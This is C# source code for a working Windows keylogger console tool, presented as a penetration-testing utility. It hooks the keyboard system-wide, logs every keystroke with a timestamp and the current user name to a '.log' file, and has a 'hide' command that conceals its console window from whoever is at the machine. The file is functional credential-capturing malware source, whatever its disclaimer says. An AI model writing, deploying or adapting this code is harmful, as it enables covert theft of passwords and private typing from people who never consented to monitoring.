using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        private const int SW_SHOW = 5;
        private const int SW_HIDE = 0;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static IntPtr _hookID = IntPtr.Zero;
        private static string Path = Application.StartupPath + @"\.log";
        private static Thread Prc;

        static void Main()
        {
            Console.WriteLine("Windows KeyLogger [Version 1.0]");
            Console.WriteLine("(c) 2018 Bernard2518141184. Licensed under Apache License.");
            Console.WriteLine("This tool is for penetration testing only.");
            Console.WriteLine("You are responsible for any issues caused.");
            Console.WriteLine();
            CmdPrc();
        }

        private static void CmdPrc()
        {
            Console.Write(">");
            string line = Console.ReadLine();
            if (line.Length == 0)
            {
                CmdPrc();
                return;
            }
            string[] array = line.Split(' ');
            if (array[0].Equals("hide"))
            {
                try
                {
                    IntPtr handle = GetConsoleWindow();
                    ShowWindow(handle, SW_HIDE);
                    if (array.Length >= 2)
                    {
                        int period = Convert.ToInt32(array[1]);
                        if (period > -1)
                        {
                            new Thread(() =>
                            {
                                Thread.Sleep(period);
                                ShowWindow(handle, SW_SHOW);
                            }).Start();
                        }
                    }
                    Console.WriteLine("Window has been successfully hided.");
                }
                catch (FormatException)
                {
                    Console.WriteLine("Invalid time period.");
                }
                catch
                {
                    Console.WriteLine("An error occurred while attempting to hide the window.");
                }
            }
            else if (array[0].Equals("log"))
            {
                if (array.Length >= 2)
                {
                    Console.WriteLine("The location of the target file to log to is set to:");
                    Console.WriteLine(Path = line.Substring(4));
                }
                else
                {
                    Console.WriteLine("The location of the current target file to log to:");
                    Console.WriteLine(Path);
                }
            }
            else
            {
                switch (line)
                {
                    case "end":
                        {
                            Console.WriteLine("Press any key to continue...");
                            Console.ReadKey();
                            return;
                        }
                    case "start":
                        {
                            if (Prc != null)
                            {
                                Console.WriteLine("Key logging is already started.");
                            }
                            else
                            {
                                bool cont = false;
                                (Prc = new Thread(() =>
                                {
                                    if ((_hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, LoadLibrary("user32.dll"), 0)) != IntPtr.Zero)
                                    {
                                        Console.WriteLine("Key logging has successfully started.");
                                    }
                                    else
                                    {
                                        Console.WriteLine("Key logging has failed to start.");
                                        Console.WriteLine("Error code: " + Marshal.GetLastWin32Error());
                                    }
                                    cont = true;
                                    Application.Run();
                                })).Start();
                                while (!cont) { }
                            }
                        }
                        break;
                    case "stop":
                        {
                            if (Prc == null)
                            {
                                Console.WriteLine("Key logging is not started.");
                            }
                            else
                            {
                                Prc.Abort();
                                Prc = null;
                                if (UnhookWindowsHookEx(_hookID))
                                {
                                    Console.WriteLine("Key logging has successfully stopped.");
                                }
                                else
                                {

                                    Console.WriteLine("Key logging has failed to stop.");
                                }
                            }
                        }
                        break;
                    default:
                        {
                            Console.WriteLine("Invalid command.");
                        }
                        break;
                }
            }
            Console.WriteLine();
            CmdPrc();
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                using (StreamWriter writer = new StreamWriter(Path, true))
                {
                    writer.Write(DateTime.Now.ToShortDateString());
                    writer.Write(" ");
                    writer.Write(DateTime.Now.ToLongTimeString());
                    writer.Write(" ");
                    writer.Write(Environment.UserName);
                    writer.Write(" ");
                    writer.WriteLine((Keys)Marshal.ReadInt32(lParam));
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dll);

    }
}
